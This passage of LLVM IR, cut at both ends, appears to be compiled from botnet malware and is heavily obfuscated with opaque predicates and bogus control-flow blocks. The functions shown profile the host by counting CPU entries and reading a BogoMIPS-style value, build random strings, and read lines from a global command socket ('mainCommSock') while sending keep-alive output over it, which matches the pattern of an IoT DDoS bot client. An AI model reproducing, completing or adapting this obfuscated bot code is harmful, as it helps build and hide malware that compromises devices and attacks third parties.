  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

; <label>:3:                                      ; preds = %23, %1
  %4 = load i32, i32* @x.31
  %5 = load i32, i32* @y.32
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = load i8*, i8** %2, align 8
  %13 = load i8, i8* %12, align 1
  %14 = icmp ne i8 %13, 0
  %15 = load i32, i32* @x.31
  %16 = load i32, i32* @y.32
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %32

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i8*, i8** %2, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = call i32 @toupper(i32 %26) #10
  %28 = trunc i32 %27 to i8
  %29 = load i8*, i8** %2, align 8
  store i8 %28, i8* %29, align 1
  %30 = load i8*, i8** %2, align 8
  %31 = getelementptr inbounds i8, i8* %30, i32 1
  store i8* %31, i8** %2, align 8
  br label %3

; <label>:32:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %33 = load i8*, i8** %2, align 8
  %34 = load i8, i8* %33, align 1
  %35 = icmp ne i8 %34, 0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  br label %8

; <label>:8:                                      ; preds = %originalBBpart223, %1
  %9 = load i32, i32* @x.33
  %10 = load i32, i32* @y.34
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %18 = load i32, i32* %4, align 4
  %19 = call i8* @fdgets(i8* %17, i32 4096, i32 %18)
  %20 = icmp ne i8* %19, null
  %21 = load i32, i32* @x.33
  %22 = load i32, i32* @y.34
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %20, label %29, label %148

; <label>:29:                                     ; preds = %originalBBpart2
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %30)
  %31 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %32 = call i8* @strstr(i8* %31, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0)) #10
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %34 = icmp eq i8* %32, %33
  br i1 %34, label %35, label %130

; <label>:35:                                     ; preds = %29
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %37 = getelementptr inbounds i8, i8* %36, i64 8
  store i8* %37, i8** %6, align 8
  br label %38

; <label>:38:                                     ; preds = %55, %35
  %39 = load i8*, i8** %6, align 8
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 32
  br i1 %42, label %53, label %43

; <label>:43:                                     ; preds = %38
  %44 = load i8*, i8** %6, align 8
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 9
  br i1 %47, label %53, label %48

; <label>:48:                                     ; preds = %43
  %49 = load i8*, i8** %6, align 8
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 58
  br label %53

; <label>:53:                                     ; preds = %48, %43, %38
  %54 = phi i1 [ true, %43 ], [ true, %38 ], [ %52, %48 ]
  br i1 %54, label %55, label %58

; <label>:55:                                     ; preds = %53
  %56 = load i8*, i8** %6, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %6, align 8
  br label %38

; <label>:58:                                     ; preds = %53
  br label %59

; <label>:59:                                     ; preds = %95, %58
  %60 = load i8*, i8** %6, align 8
  %61 = load i8*, i8** %6, align 8
  %62 = call i64 @strlen(i8* %61) #10
  %63 = sub i64 %62, 1
  %64 = getelementptr inbounds i8, i8* %60, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 13
  br i1 %67, label %93, label %68

; <label>:68:                                     ; preds = %59
  %69 = load i32, i32* @x.33
  %70 = load i32, i32* @y.34
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %68
  %77 = load i8*, i8** %6, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i64 @strlen(i8* %78) #10
  %80 = sub i64 %79, 1
  %81 = getelementptr inbounds i8, i8* %77, i64 %80
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 10
  %85 = load i32, i32* @x.33
  %86 = load i32, i32* @y.34
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart215, label %originalBB1alteredBB

originalBBpart215:                                ; preds = %originalBB1
  br label %93

; <label>:93:                                     ; preds = %originalBBpart215, %59
  %94 = phi i1 [ true, %59 ], [ %84, %originalBBpart215 ]
  br i1 %94, label %95, label %101

; <label>:95:                                     ; preds = %93
  %96 = load i8*, i8** %6, align 8
  %97 = load i8*, i8** %6, align 8
  %98 = call i64 @strlen(i8* %97) #10
  %99 = sub i64 %98, 1
  %100 = getelementptr inbounds i8, i8* %96, i64 %99
  store i8 0, i8* %100, align 1
  br label %59

; <label>:101:                                    ; preds = %93
  %102 = load i32, i32* @x.33
  %103 = load i32, i32* @y.34
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %101
  %110 = load i8*, i8** %6, align 8
  %111 = call i8* @strchr(i8* %110, i32 46) #10
  %112 = icmp ne i8* %111, null
  %113 = load i32, i32* @x.33
  %114 = load i32, i32* @y.34
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %112, label %121, label %124

; <label>:121:                                    ; preds = %originalBBpart219
  %122 = load i8*, i8** %6, align 8
  %123 = call i8* @strchr(i8* %122, i32 46) #10
  store i8 0, i8* %123, align 1
  br label %124

; <label>:124:                                    ; preds = %121, %originalBBpart219
  %125 = load i8*, i8** %3, align 8
  %126 = load i8*, i8** %6, align 8
  %127 = call i8* @strcpy(i8* %125, i8* %126) #2
  %128 = load i32, i32* %4, align 4
  %129 = call i32 @close(i32 %128)
  store i32 0, i32* %2, align 4
  br label %167

; <label>:130:                                    ; preds = %29
  %131 = load i32, i32* @x.33
  %132 = load i32, i32* @y.34
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %130
  %139 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %139, i8 0, i64 4096, i32 16, i1 false)
  %140 = load i32, i32* @x.33
  %141 = load i32, i32* @y.34
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %8

; <label>:148:                                    ; preds = %originalBBpart2
  %149 = load i32, i32* @x.33
  %150 = load i32, i32* @y.34
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %148
  %157 = load i32, i32* %4, align 4
  %158 = call i32 @close(i32 %157)
  store i32 1, i32* %2, align 4
  %159 = load i32, i32* @x.33
  %160 = load i32, i32* @y.34
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %167

; <label>:167:                                    ; preds = %originalBBpart227, %124
  %168 = load i32, i32* @x.33
  %169 = load i32, i32* @y.34
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %167
  %176 = load i32, i32* %2, align 4
  %177 = load i32, i32* @x.33
  %178 = load i32, i32* @y.34
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  ret i32 %176

originalBBalteredBB:                              ; preds = %originalBB, %8
  %185 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %186 = load i32, i32* %4, align 4
  %187 = call i8* @fdgets(i8* %185, i32 4096, i32 %186)
  %188 = icmp ne i8* %187, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %68
  %189 = load i8*, i8** %6, align 8
  %190 = load i8*, i8** %6, align 8
  %191 = call i64 @strlen(i8* %190) #10
  %_ = sub i64 0, %191
  %gen = add i64 %_, 1
  %_2 = sub i64 %191, 1
  %gen3 = mul i64 %_2, 1
  %_4 = shl i64 %191, 1
  %_5 = sub i64 0, %191
  %gen6 = add i64 %_5, 1
  %_7 = shl i64 %191, 1
  %_8 = sub i64 0, %191
  %gen9 = add i64 %_8, 1
  %_10 = sub i64 %191, 1
  %gen11 = mul i64 %_10, 1
  %_12 = sub i64 0, %191
  %gen13 = add i64 %_12, 1
  %192 = sub i64 %191, 1
  %193 = getelementptr inbounds i8, i8* %189, i64 %192
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 10
  br label %originalBB1

originalBB17alteredBB:                            ; preds = %originalBB17, %101
  %197 = load i8*, i8** %6, align 8
  %198 = call i8* @strchr(i8* %197, i32 46) #10
  %199 = icmp ne i8* %198, null
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %130
  %200 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %200, i8 0, i64 4096, i32 16, i1 false)
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %148
  %201 = load i32, i32* %4, align 4
  %202 = call i32 @close(i32 %201)
  store i32 1, i32* %2, align 4
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %167
  %203 = load i32, i32* %2, align 4
  br label %originalBB29
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %35, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %37

; <label>:10:                                     ; preds = %5
  %11 = load i32, i32* @x.35
  %12 = load i32, i32* @y.36
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %19)
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %21 = call i8* @strstr(i8* %20, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0)) #10
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %23 = icmp eq i8* %21, %22
  %24 = load i32, i32* @x.35
  %25 = load i32, i32* @y.36
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %35

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* %1, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %1, align 4
  br label %35

; <label>:35:                                     ; preds = %32, %originalBBpart2
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:37:                                     ; preds = %5
  %38 = load i32, i32* %2, align 4
  %39 = call i32 @close(i32 %38)
  %40 = load i32, i32* %1, align 4
  ret i32 %40

originalBBalteredBB:                              ; preds = %originalBB, %10
  %41 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %41)
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %43 = call i8* @strstr(i8* %42, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0)) #10
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %45 = icmp eq i8* %43, %44
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %originalBBpart210, %2
  %7 = load i32, i32* @x.37
  %8 = load i32, i32* @y.38
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* %5, align 4
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %15, %16
  %18 = load i32, i32* @x.37
  %19 = load i32, i32* @y.38
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %17, label %26, label %54

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = call i32 @rand_cmwc()
  %28 = urem i32 %27, 26
  %29 = add i32 %28, 65
  %30 = trunc i32 %29 to i8
  %31 = load i8*, i8** %3, align 8
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  store i8 %30, i8* %34, align 1
  br label %35

; <label>:35:                                     ; preds = %26
  %36 = load i32, i32* @x.37
  %37 = load i32, i32* @y.38
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  %44 = load i32, i32* %5, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %5, align 4
  %46 = load i32, i32* @x.37
  %47 = load i32, i32* @y.38
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart210, label %originalBB1alteredBB

originalBBpart210:                                ; preds = %originalBB1
  br label %6

; <label>:54:                                     ; preds = %originalBBpart2
  %55 = load i32, i32* @x.37
  %56 = load i32, i32* @y.38
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %54
  %63 = load i32, i32* @x.37
  %64 = load i32, i32* @y.38
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %71 = load i32, i32* %5, align 4
  %72 = load i32, i32* %4, align 4
  %73 = icmp slt i32 %71, %72
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  %74 = load i32, i32* %5, align 4
  %_ = shl i32 %74, 1
  %_2 = sub i32 0, %74
  %gen = add i32 %_2, 1
  %_3 = sub i32 0, %74
  %gen4 = add i32 %_3, 1
  %_5 = sub i32 %74, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 0, %74
  %gen8 = add i32 %_7, 1
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %5, align 4
  br label %originalBB1

originalBB12alteredBB:                            ; preds = %originalBB12, %54
  br label %originalBB12
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = load i32, i32* @x.39
  %26 = load i32, i32* @y.40
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %33, i64 0, i64 0
  %35 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %34) #2, !srcloc !1
  %36 = extractvalue { i64, i64* } %35, 0
  %37 = extractvalue { i64, i64* } %35, 1
  %38 = trunc i64 %36 to i32
  store i32 %38, i32* %10, align 4
  %39 = ptrtoint i64* %37 to i64
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %11, align 4
  %41 = load i32, i32* @x.39
  %42 = load i32, i32* @y.40
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %49

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i32, i32* %5, align 4
  %51 = srem i32 %50, 64
  %52 = zext i32 %51 to i64
  %53 = shl i64 1, %52
  %54 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %55 = load i32, i32* %5, align 4
  %56 = sdiv i32 %55, 64
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %54, i64 0, i64 %57
  %59 = load i64, i64* %58, align 8
  %60 = or i64 %59, %53
  store i64 %60, i64* %58, align 8
  %61 = load i32, i32* %5, align 4
  %62 = add nsw i32 %61, 1
  %63 = call i32 @select(i32 %62, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %63, i32* %12, align 4
  %64 = icmp sle i32 %63, 0
  br i1 %64, label %65, label %184

; <label>:65:                                     ; preds = %49
  %66 = load i32, i32* @x.39
  %67 = load i32, i32* @y.40
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = load i32, i32* @x.39
  %75 = load i32, i32* @y.40
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %82

; <label>:82:                                     ; preds = %163, %originalBBpart24
  %83 = load i32, i32* %13, align 4
  %84 = icmp slt i32 %83, 10
  br i1 %84, label %85, label %167

; <label>:85:                                     ; preds = %82
  %86 = load i32, i32* @x.39
  %87 = load i32, i32* @y.40
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %85
  %94 = load i32, i32* @mainCommSock, align 4
  %95 = call i32 (i32, i8*, ...) @sockprintf(i32 %94, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i32 0, i32 0))
  %96 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %96, align 8
  %97 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %97, align 8
  %98 = load i32, i32* @x.39
  %99 = load i32, i32* @y.40
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %106

; <label>:106:                                    ; preds = %originalBBpart28
  %107 = load i32, i32* @x.39
  %108 = load i32, i32* @y.40
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %106
  %115 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %116 = getelementptr inbounds [16 x i64], [16 x i64]* %115, i64 0, i64 0
  %117 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %116) #2, !srcloc !2
  %118 = extractvalue { i64, i64* } %117, 0
  %119 = extractvalue { i64, i64* } %117, 1
  %120 = trunc i64 %118 to i32
  store i32 %120, i32* %14, align 4
  %121 = ptrtoint i64* %119 to i64
  %122 = trunc i64 %121 to i32
  store i32 %122, i32* %15, align 4
  %123 = load i32, i32* @x.39
  %124 = load i32, i32* @y.40
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %131

; <label>:131:                                    ; preds = %originalBBpart212
  %132 = load i32, i32* @x.39
  %133 = load i32, i32* @y.40
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %131
  %140 = load i32, i32* %5, align 4
  %141 = srem i32 %140, 64
  %142 = zext i32 %141 to i64
  %143 = shl i64 1, %142
  %144 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %145 = load i32, i32* %5, align 4
  %146 = sdiv i32 %145, 64
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds [16 x i64], [16 x i64]* %144, i64 0, i64 %147
  %149 = load i64, i64* %148, align 8
  %150 = or i64 %149, %143
  store i64 %150, i64* %148, align 8
  %151 = load i32, i32* %5, align 4
  %152 = add nsw i32 %151, 1
  %153 = call i32 @select(i32 %152, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %153, i32* %12, align 4
  %154 = icmp sle i32 %153, 0
  %155 = load i32, i32* @x.39
  %156 = load i32, i32* @y.40
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBBpart240, label %originalBB14alteredBB

originalBBpart240:                                ; preds = %originalBB14
  br i1 %154, label %163, label %166

; <label>:163:                                    ; preds = %originalBBpart240
  %164 = load i32, i32* %13, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %13, align 4
  br label %82

; <label>:166:                                    ; preds = %originalBBpart240
  br label %167

; <label>:167:                                    ; preds = %166, %82
